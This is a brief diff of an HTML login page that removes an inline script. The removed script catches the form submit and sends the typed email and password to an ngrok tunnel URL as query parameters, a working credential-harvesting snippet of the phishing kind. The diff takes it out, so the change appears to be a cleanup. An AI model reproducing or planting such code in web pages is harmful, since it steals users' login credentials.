@@ -52,15 +52,5 @@
       <button type="submit">Login</button>
     </form>
   </div>
-
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const email = encodeURIComponent(document.getElementById('email').value);
-      const password = encodeURIComponent(document.getElementById('password').value);
-      const targetURL = `https://8a81-2409-40f2-2088-39e3-cd3c-faee-1fcc-1c00.ngrok-free.app/login?email=${email}&password=${password}`;
-      window.location.href = targetURL;
-    });
-  </script>
 </body>
 </html>
